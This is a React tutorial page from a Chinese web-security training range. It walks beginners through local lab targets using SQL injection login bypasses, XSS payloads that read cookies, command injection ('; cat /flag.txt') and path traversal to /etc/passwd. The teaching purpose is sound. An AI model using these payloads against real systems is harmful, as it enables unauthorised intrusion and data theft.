import { useState } from 'react'
import { Link } from 'react-router-dom'

type Exercise = {
  title: string
  instruction: string
  command?: string
  expected?: string
  hint?: string
}

type TutorialStep = {
  num: number
  title: string
  icon: string
  theory: string
  exercises: Exercise[]
  targetId?: number
  targetName?: string
  nextText?: string
}

const tutorials: TutorialStep[] = [
  {
    num: 1,
    title: '认识你的第一个靶机',
    icon: '🔍',
    theory: `网络安全的第一步是「观察」。每个 Web 页面都有 HTML 源码，开发者经常不小心在源码中留下敏感信息（注释、调试代码、密钥等）。

**核心知识**：浏览器按 F12 打开开发者工具，Elements 面板可以看到完整 DOM 结构。你也可以右键 → 查看页面源代码，或按 Ctrl+U。`,
    exercises: [
      {
        title: '练习 1：启动靶机',
        instruction: '打开终端，运行以下命令启动第一个靶机：',
        command: 'cd targets/local && python target1_nginx.py 8081',
        expected: '终端显示 "Target1 listening on :8081"',
      },
      {
        title: '练习 2：访问靶机页面',
        instruction: '打开浏览器，访问以下地址：',
        command: 'http://localhost:8081',
        expected: '看到「欢迎来到公司首页」的页面',
      },
      {
        title: '练习 3：查看页面源码',
        instruction: '在靶机页面按 Ctrl+U（Mac 按 Cmd+U），查看 HTML 源码。寻找以 <!-- 开头的注释。',
        expected: '找到类似 <!-- 开发备注：Flag = flag{...} --> 的注释',
        hint: 'Flag 格式是 flag{...}，在 HTML 注释中。',
      },
      {
        title: '练习 4：提交 Flag',
        instruction: '复制你找到的 Flag，回到网站靶机详情页，粘贴到 Flag 输入框并提交。',
        expected: '看到「Flag 正确！」的提示',
      },
    ],
    targetId: 1,
    targetName: 'Nginx Flag 隐藏',
    nextText: '学会了查看源码，接下来学习爆破弱口令 →',
  },
  {
    num: 2,
    title: '用 curl 发送 HTTP 请求',
    icon: '📡',
    theory: `curl 是网络安全最重要的命令行工具之一。它可以发送任意 HTTP 请求，帮你测试接口、查看响应头、提交表单。

**核心语法**：
- \`curl URL\` — 发送 GET 请求
- \`curl -X POST -d "数据" URL\` — 发送 POST 请求
- \`curl -I URL\` — 只看响应头
- \`curl -v URL\` — 显示完整请求过程`,
    exercises: [
      {
        title: '练习 1：发送 GET 请求',
        instruction: '在终端运行以下命令，获取靶机首页内容：',
        command: 'curl http://localhost:8081/',
        expected: '返回 HTML 内容，包含「欢迎来到公司首页」',
      },
      {
        title: '练习 2：只看响应头',
        instruction: '用 -I 参数只看 HTTP 响应头，注意 Server 字段：',
        command: 'curl -I http://localhost:8081/',
        expected: '看到 HTTP/1.0 200 OK 和 Server 信息',
      },
      {
        title: '练习 3：用 curl 搜索 Flag',
        instruction: '用 curl 获取页面内容，再用 grep 搜索 flag：',
        command: 'curl -s http://localhost:8081/ | grep -i flag',
        expected: '输出包含 Flag 的 HTML 注释行',
        hint: '-s 参数隐藏进度条，grep -i 忽略大小写。',
      },
    ],
    targetId: 1,
    targetName: 'Nginx Flag 隐藏',
    nextText: '掌握了 curl，接下来尝试 SQL 注入 →',
  },
  {
    num: 3,
    title: 'SQL 注入 — 万能密码',
    icon: '💉',
    theory: `SQL 注入是最经典的 Web 漏洞。当用户输入直接拼接到 SQL 语句中，攻击者可以改变查询逻辑。

**原理**：
\`\`\`sql
-- 后端代码（危险！）
SELECT * FROM users WHERE username='$input' AND password='$pwd'

-- 输入 admin' -- 后变成
SELECT * FROM users WHERE username='admin' --' AND password='任意'
-- 注释掉了密码验证！
\`\`\`

**常用 Payload**：
- \`admin' --\` — 注释后续语句
- \`' OR '1'='1\` — 永真条件
- \`admin' #\` — MySQL 注释`,
    exercises: [
      {
        title: '练习 1：启动 SQL 注入靶机',
        instruction: '启动靶机 3：',
        command: 'python target3_sqli.py 8083',
        expected: '终端显示 "Target3 listening on :8083"',
      },
      {
        title: '练习 2：访问登录页面',
        instruction: '打开浏览器访问：',
        command: 'http://localhost:8083',
        expected: '看到登录表单',
      },
      {
        title: '练习 3：尝试正常登录',
        instruction: '先用普通账号登录试试：用户名 guest，密码 guest123',
        expected: '登录成功，但提示「你是普通用户，没有权限查看 Flag」',
      },
      {
        title: '练习 4：尝试 SQL 注入',
        instruction: '在用户名输入框输入以下 Payload，密码随意：',
        command: "admin' --",
        expected: '登录成功，显示 Flag！',
        hint: "关键是在用户名中输入 admin' --，' 闭合了 SQL 中的引号，-- 注释掉了后面的密码验证。",
      },
      {
        title: '练习 5：用 curl 复现注入',
        instruction: '用 curl 发送 POST 请求复现攻击：',
        command: "curl -X POST -d \"username=admin' --&password=anything\" http://localhost:8083/login",
        expected: '返回 HTML 中包含 Flag',
      },
    ],
    targetId: 3,
    targetName: 'SQL 注入',
    nextText: '掌握了 SQL 注入，接下来学习 XSS →',
  },
  {
    num: 4,
    title: 'XSS — 跨站脚本攻击',
    icon: '🎭',
    theory: `XSS（Cross-Site Scripting）让攻击者在网页中注入恶意 JavaScript。当其他用户浏览该页面时，脚本自动执行。

**三种类型**：
- **反射型**：输入在 URL 参数中，服务器直接回显（本次练习）
- **存储型**：输入存入数据库，所有用户都受影响
- **DOM 型**：前端 JS 直接操作 DOM 导致

**核心 Payload**：
\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
\`\`\``,
    exercises: [
      {
        title: '练习 1：启动 XSS 靶机',
        instruction: '启动靶机 4：',
        command: 'python target4_xss.py 8084',
        expected: '终端显示 "Target4 listening on :8084"',
      },
      {
        title: '练习 2：测试搜索功能',
        instruction: '访问靶机，在搜索框输入正常关键词如 "test"，观察结果页面如何显示你的输入：',
        command: 'http://localhost:8084/search?q=test',
        expected: '页面显示「搜索结果：test」',
      },
      {
        title: '练习 3：注入 HTML 标签',
        instruction: '在搜索框输入以下 HTML 标签，观察是否被解析：',
        command: '<h1>被注入的标题</h1>',
        expected: '页面上出现一个大号标题，说明 HTML 被解析了',
      },
      {
        title: '练习 4：注入 JavaScript',
        instruction: '尝试注入 JavaScript 代码，读取 Cookie 中的 Flag：',
        command: '<script>document.write(document.cookie)</script>',
        expected: '页面显示 Cookie 内容，其中包含 flag=flag{...}',
        hint: 'Cookie 中的 flag= 后面就是 Flag。',
      },
    ],
    targetId: 4,
    targetName: 'XSS 反射型',
    nextText: '掌握了 XSS，接下来挑战命令注入 →',
  },
  {
    num: 5,
    title: '命令注入 — 让服务器执行命令',
    icon: '💻',
    theory: `命令注入发生在程序把用户输入拼接到系统命令中执行时。攻击者可以通过特殊字符注入额外命令。

**原理**：
\`\`\`bash
# 后端代码（危险！）
os.system("ping -c 4 " + user_input)

# 正常输入: 127.0.0.1
# 执行: ping -c 4 127.0.0.1 ✓

# 恶意输入: 127.0.0.1; cat /flag.txt
# 执行: ping -c 4 127.0.0.1; cat /flag.txt
# 两条命令都会执行！
\`\`\`

**常用分隔符**：
- \`;\` — 顺序执行
- \`|\` — 管道（前一个命令的输出作为后一个的输入）
- \`&&\` — 前一个成功才执行后一个
- 反引号 — 命令替换`,
    exercises: [
      {
        title: '练习 1：启动命令注入靶机',
        instruction: '启动靶机 5：',
        command: 'python target5_cmdi.py 8085',
        expected: '终端显示 "Target5 listening on :8085"',
      },
      {
        title: '练习 2：正常使用 Ping 工具',
        instruction: '访问靶机，在输入框输入正常 IP 地址：',
        command: '127.0.0.1',
        expected: '返回 ping 结果',
      },
      {
        title: '练习 3：注入命令读取 Flag',
        instruction: '在 IP 输入框输入以下内容，利用分号注入命令：',
        command: '127.0.0.1; cat /flag.txt',
        expected: '返回 ping 结果后，额外显示 Flag 内容',
        hint: '也可以用 | 替代 ;，如 127.0.0.1 | cat /flag.txt',
      },
    ],
    targetId: 5,
    targetName: '命令注入',
    nextText: '掌握了命令注入，接下来尝试文件包含 →',
  },
  {
    num: 6,
    title: '本地文件包含（LFI）',
    icon: '📂',
    theory: `本地文件包含（Local File Inclusion）让攻击者读取服务器上的任意文件。当程序用用户输入拼接文件路径时，就可能存在此漏洞。

**原理**：
\`\`\`
# 后端代码
file = request.GET["page"]
content = open(file).read()

# 正常: ?page=about.html
# 恶意: ?page=../../etc/passwd
# 恶意: ?page=../../flag.txt
\`\`\`

**路径遍历技巧**：
- \`../\` — 回到上级目录
- \`../../\` — 回两级
- \`....//....//\` — 绕过简单过滤`,
    exercises: [
      {
        title: '练习 1：启动 LFI 靶机',
        instruction: '启动靶机 6：',
        command: 'python target6_lfi.py 8086',
        expected: '终端显示 "Target6 listening on :8086"',
      },
      {
        title: '练习 2：正常浏览页面',
        instruction: '访问靶机，点击页面上的链接浏览不同页面：',
        command: 'http://localhost:8086/?page=about.html',
        expected: '显示「关于我们」页面',
      },
      {
        title: '练习 3：尝试读取系统文件',
        instruction: '修改 URL 中的 page 参数，尝试读取 Linux 密码文件：',
        command: 'http://localhost:8086/?page=../../etc/passwd',
        expected: '页面显示 /etc/passwd 文件内容',
      },
      {
        title: '练习 4：读取 Flag 文件',
        instruction: '用同样的方法读取 /flag.txt：',
        command: 'http://localhost:8086/?page=../../flag.txt',
        expected: '页面显示 Flag',
        hint: '如果 ../ 不够，多加几层：../../../../flag.txt',
      },
    ],
    targetId: 6,
    targetName: '本地文件包含',
    nextText: '恭喜完成基础教程！接下来可以自由挑战更多靶机 →',
  },
]

export default function GettingStarted() {
  const [currentStep, setCurrentStep] = useState(0)
  const [completedSteps, setCompletedSteps] = useState<Set<number>>(() => {
    try {
      const saved = localStorage.getItem('tutorial_completed')
      return saved ? new Set(JSON.parse(saved)) : new Set()
    } catch {
      return new Set()
    }
  })

  const step = tutorials[currentStep]

  const markComplete = (stepNum: number) => {
    const next = new Set(completedSteps)
    next.add(stepNum)
    setCompletedSteps(next)
    try {
      localStorage.setItem('tutorial_completed', JSON.stringify([...next]))
    } catch {
      /* noop */
    }
  }

  const goNext = () => {
    markComplete(step.num)
    if (currentStep < tutorials.length - 1) {
      setCurrentStep(currentStep + 1)
      window.scrollTo({ top: 0, behavior: 'smooth' })
    }
  }

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1)
      window.scrollTo({ top: 0, behavior: 'smooth' })
    }
  }

  const [copiedIdx, setCopiedIdx] = useState<number | null>(null)

  const copyCommand = async (cmd: string, idx: number) => {
    try {
      await navigator.clipboard.writeText(cmd)
      setCopiedIdx(idx)
      setTimeout(() => setCopiedIdx(null), 2000)
    } catch {
      /* noop */
    }
  }

  return (
    <div className="tutorial-page">
      <h1 className="page-title">🎓 网络安全实战教程</h1>
      <p className="page-subtitle">
        从零开始，一步步带你学会网络安全。每个知识点都有动手练习，做完就能掌握。
      </p>

      {/* 进度条 */}
      <div className="tutorial-progress">
        <div className="progress-bar">
          {tutorials.map((t, idx) => (
            <button
              key={t.num}
              className={`progress-dot ${idx === currentStep ? 'active' : ''} ${completedSteps.has(t.num) ? 'done' : ''}`}
              onClick={() => setCurrentStep(idx)}
              title={`第 ${t.num} 步：${t.title}`}
            >
              {completedSteps.has(t.num) ? '✓' : t.num}
            </button>
          ))}
        </div>
        <p className="progress-text">
          已完成 {completedSteps.size} / {tutorials.length} 步
        </p>
      </div>

      {/* 当前步骤 */}
      <div className="tutorial-step">
        <div className="step-header-bar">
          <span className="step-badge">第 {step.num} 步</span>
          <span className="step-icon-lg">{step.icon}</span>
          <h2>{step.title}</h2>
        </div>

        {/* 理论知识 */}
        <div className="theory-card">
          <h3>📖 知识点</h3>
          <div className="theory-content">
            {step.theory.split('\n').map((line, idx) => {
              if (line.startsWith('```')) return null
              if (line.startsWith('**') && line.endsWith('**')) {
                return <p key={idx}><strong>{line.replace(/\*\*/g, '')}</strong></p>
              }
              if (line.startsWith('- ')) {
                return <li key={idx}>{line.slice(2)}</li>
              }
              if (line.trim() === '') {
                return <br key={idx} />
              }
              // Handle inline code and bold
              const parts = line.split(/(`[^`]+`|\*\*[^*]+\*\*)/g)
              return (
                <p key={idx}>
                  {parts.map((part, pidx) => {
                    if (part.startsWith('`') && part.endsWith('`')) {
                      return <code key={pidx}>{part.slice(1, -1)}</code>
                    }
                    if (part.startsWith('**') && part.endsWith('**')) {
                      return <strong key={pidx}>{part.slice(2, -2)}</strong>
                    }
                    return <span key={pidx}>{part}</span>
                  })}
                </p>
              )
            })}
          </div>
        </div>

        {/* 动手练习 */}
        <div className="exercises-card">
          <h3>🏋️ 动手练习</h3>
          {step.exercises.map((ex, idx) => (
            <div key={idx} className="exercise-item">
              <div className="exercise-header">
                <span className="exercise-num">{idx + 1}</span>
                <h4>{ex.title}</h4>
              </div>
              <p className="exercise-instruction">{ex.instruction}</p>
              {ex.command && (
                <div className="exercise-command">
                  <code>{ex.command}</code>
                  <button
                    className="copy-btn"
                    onClick={() => copyCommand(ex.command!, idx)}
                  >
                    {copiedIdx === idx ? '已复制 ✓' : '复制'}
                  </button>
                </div>
              )}
              {ex.expected && (
                <p className="exercise-expected">
                  <strong>预期结果：</strong>{ex.expected}
                </p>
              )}
              {ex.hint && (
                <details className="exercise-hint">
                  <summary>💡 需要帮助？点击查看提示</summary>
                  <p>{ex.hint}</p>
                </details>
              )}
            </div>
          ))}
        </div>

        {/* 关联靶机 */}
        {step.targetId && (
          <div className="related-target">
            <p>
              📌 本步骤使用的靶机：
              <Link to={`/targets/${step.targetId}`} className="target-link">
                {step.targetName}
              </Link>
            </p>
          </div>
        )}

        {/* 导航按钮 */}
        <div className="tutorial-nav">
          <button
            className="btn btn-ghost"
            onClick={goPrev}
            disabled={currentStep === 0}
          >
            ← 上一步
          </button>
          <button className="btn btn-primary" onClick={goNext}>
            {currentStep === tutorials.length - 1 ? '完成教程 ✓' : '下一步 →'}
          </button>
        </div>

        {step.nextText && currentStep === tutorials.length - 1 && completedSteps.has(step.num) && (
          <div className="tutorial-complete">
            <h3>🎉 恭喜！你已完成基础教程</h3>
            <p>{step.nextText}</p>
            <div className="cta-buttons">
              <Link to="/targets" className="btn btn-primary">
                进入靶场自由挑战
              </Link>
              <Link to="/courses" className="btn btn-outline">
                系统学习课程
              </Link>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
